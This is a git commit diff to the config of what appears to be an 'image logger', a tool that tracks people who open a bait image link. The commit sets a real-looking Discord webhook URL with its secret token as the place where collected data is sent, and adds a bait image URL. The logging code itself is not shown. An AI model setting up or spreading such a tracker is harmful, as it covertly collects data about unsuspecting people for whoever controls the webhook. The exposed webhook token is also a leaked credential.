faef47b3c82b8fa808f07c2fd9bb0ed9399b9ebb
Efe315648812das <97255216+Efe315648812das@users.noreply.github.com>
2025-03-15 20:47:10 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1350123210699702365/Lkfsl_WnxbVYZvL_rBuHIrBGUIWsXprdlwX9rjkoZdahfpfzgrHV4gQVlKXtoM9Guxbz",
+    "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNhc3Df7WEdL52zsIMFcwfgsCxj_TKr6EeffXNDX9kzYZyr5KsyfSB1v9GuZYxKvLubZ19mgbZYw21hQOHAjunGHbJPQLLgRgHGd7Hs0anCTKr6EeffXNDX9kzYZyr5KsyfSB1v9GuZYxP/s1600/S%25C4%25B1f%25C4%25B1r+Bir+Cio+Baba+Sava%25C5%259F+Sat%25C4%25B1%25C5%259F.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
